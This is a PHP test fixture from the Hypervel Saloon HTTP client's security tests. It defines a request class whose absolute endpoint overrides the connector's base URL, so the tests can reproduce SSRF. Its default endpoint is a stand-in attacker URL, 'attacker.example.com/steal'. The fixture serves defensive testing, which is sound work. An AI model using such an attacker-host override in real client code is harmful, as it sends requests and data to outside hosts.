<?php

declare(strict_types=1);

namespace Hypervel\Tests\Saloon\Fixtures\Requests;

use Hypervel\Saloon\Enums\Method;
use Hypervel\Saloon\Http\Request;

/**
 * Request whose endpoint is an absolute URL - used to replicate SSRF
 * (absolute URL override of baseUrl) in security tests.
 */
class AbsoluteEndpointRequest extends Request
{
    protected Method $method = Method::GET;

    /**
     * Create a new request instance.
     *
     * Hypervel declares the base URL override through a method, so the request's choice is a constructor argument
     * instead of upstream's public property.
     */
    public function __construct(
        private readonly string $endpoint = 'https://attacker.example.com/steal',
        private readonly ?bool $allowBaseUrlOverride = null,
    ) {
    }

    /**
     * Resolve the request endpoint.
     */
    public function resolveEndpoint(): string
    {
        return $this->endpoint;
    }

    /**
     * Resolve whether this request may replace the connector base URL.
     */
    public function allowsBaseUrlOverride(): ?bool
    {
        return $this->allowBaseUrlOverride;
    }
}
